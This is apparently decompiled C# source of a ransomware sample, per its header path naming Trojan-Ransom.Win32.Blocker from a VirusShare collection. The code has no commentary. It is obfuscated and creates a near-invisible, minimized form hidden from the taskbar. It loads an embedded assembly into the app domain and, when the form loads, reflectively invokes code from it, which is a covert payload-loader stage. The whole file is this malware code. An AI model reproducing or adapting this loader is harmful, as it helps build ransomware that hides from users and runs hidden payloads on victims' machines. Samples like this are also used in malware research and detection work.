// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Holo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1692AE67-149A-45D4-AB0A-0CA3F19B28FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.btzw-fb43784740363420f3fd853f239a17b4f68de89292e77257010518f48115d3b3.exe

using \u0001;
using \u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u0007
{
  [DesignerGenerated]
  internal class \u0001 : Form
  {
    private static List<WeakReference> \u0001;
    private IContainer \u0001;
    private static Assembly \u0001;
    [NonSerialized]
    internal static \u0004 \u0083;

    [DebuggerNonUserCode]
    public \u0001()
    {
      this.Load += new EventHandler(this.\u0001);
      \u0007.\u0001.\u0001((object) this);
      this.\u0001();
    }

    [DebuggerNonUserCode]
    private static unsafe void \u0001(object _param0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      lock (\u0007.\u0001.\u0001)
      {
        *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (\u0007.\u0001.\u0001.Count == \u0007.\u0001.\u0001.Capacity);
        if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
          goto label_11;
label_10:
        \u0007.\u0001.\u0001.Add(new WeakReference(RuntimeHelpers.GetObjectValue(_param0)));
        return;
label_11:
        *(int*) voidPtr = 0;
        IntPtr num1 = (IntPtr) voidPtr + 4;
        *(int*) ((IntPtr) voidPtr + 8) = checked (\u0007.\u0001.\u0001.Count - 1);
        *(int*) num1 = 0;
        while (true)
        {
          do
          {
            int num2 = *(int*) ((IntPtr) voidPtr + 4);
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 8);
            int num3 = *(int*) ((IntPtr) voidPtr + 12);
            if (num2 > num3)
              goto label_9;
          }
          while (false);
          WeakReference weakReference = \u0007.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) weakReference.IsAlive;
          if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
          {
            *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (*(int*) ((IntPtr) voidPtr + 4) != *(int*) voidPtr);
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
              \u0007.\u0001.\u0001[*(int*) voidPtr] = \u0007.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
          }
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
        }
label_9:
        \u0007.\u0001.\u0001.RemoveRange(*(int*) voidPtr, checked (\u0007.\u0001.\u0001.Count - *(int*) voidPtr));
        \u0007.\u0001.\u0001.Capacity = \u0007.\u0001.\u0001.Count;
        goto label_10;
      }
    }

    [DebuggerNonUserCode]
    void Form.\u0001(bool _param1)
    {
      try
      {
        do
        {
          int num;
          for (int index = _param1 ? 1 : 0; index == 0 || this.\u0001 == null; index = num)
          {
            num = 0;
            if (num == 0)
            {
              if (num == 0)
                goto label_7;
            }
            else
              goto label_8;
          }
          num = 1;
label_7:
          bool flag;
          if (true)
            flag = num != 0;
          num = flag ? 1 : 0;
label_8:
          if (num != 0)
            goto label_13;
label_9:
          continue;
label_13:
          this.\u0001.Dispose();
          goto label_9;
        }
        while (false);
      }
      finally
      {
        do
        {
          // ISSUE: explicit non-virtual call
          __nonvirtual (((Form) this).Dispose(_param1));
        }
        while (false);
      }
      if (false)
        ;
    }

    [DebuggerStepThrough]
    private void \u0001()
    {
label_0:
      this.SuspendLayout();
label_6:
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      while (true)
      {
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(350, 43);
        if (true)
        {
          if (true)
          {
            this.Name = \u0007.\u0001.\u0083(226);
            this.Opacity = 0.01;
            if (true)
            {
              this.ShowInTaskbar = false;
              this.WindowState = FormWindowState.Minimized;
              this.ResumeLayout(false);
              break;
            }
          }
          else
            goto label_6;
        }
        else
          goto label_0;
      }
    }

    static \u0001()
    {
label_0:
      if (true)
        \u0002.\u0001(typeof (\u0007.\u0001));
      do
      {
        \u0007.\u0001.\u0001 = new List<WeakReference>();
        if (true)
          \u0007.\u0001.\u0001 = AppDomain.CurrentDomain.Load(\u0003.Load);
        else
          goto label_0;
      }
      while (false);
    }

    private void \u0001(object _param1, EventArgs _param2)
    {
      object objectValue = RuntimeHelpers.GetObjectValue(\u0007.\u0001.\u0001.CreateInstance(\u0007.\u0001.\u0083(231)));
      objectValue.GetType().InvokeMember(\u0007.\u0001.\u0083(236), BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), (object[]) null);
    }
  }
}
